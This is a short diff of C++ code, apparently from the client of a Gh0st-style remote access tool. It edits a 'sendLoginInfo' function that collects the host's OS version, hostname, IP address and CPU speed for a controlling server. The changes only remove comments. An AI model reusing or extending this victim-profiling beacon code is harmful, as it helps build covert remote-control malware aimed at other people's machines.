@@ -57,12 +57,11 @@ inline bool IsWebCam()
 int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 {
 	LOGININFO LoginInfo;
-	// 开始构造数据
+
 	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
 	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
 	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
 
-	// 主机名
 	TCHAR hostname[128] = _T("");
 
 #ifdef UNICODE
@@ -77,11 +76,10 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 	// 连接的IP地址
 	sockaddr_in  sockAddr;
 	memset(&sockAddr, 0, sizeof(sockAddr));
-	int nSockAddrLen = sizeof(sockAddr);
-	//mygetsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
+	//mygetsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, sizeof(sockAddr));
 
 	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
-	lstrcpy(LoginInfo.HostName, hostname);   //主机名
+	lstrcpy(LoginInfo.HostName, hostname);
 	lstrcpy(LoginInfo.HostReMark, _T("lx"));  //remark
 	// CPU
 	LoginInfo.CPUClockMhz = CPUClockMhz();
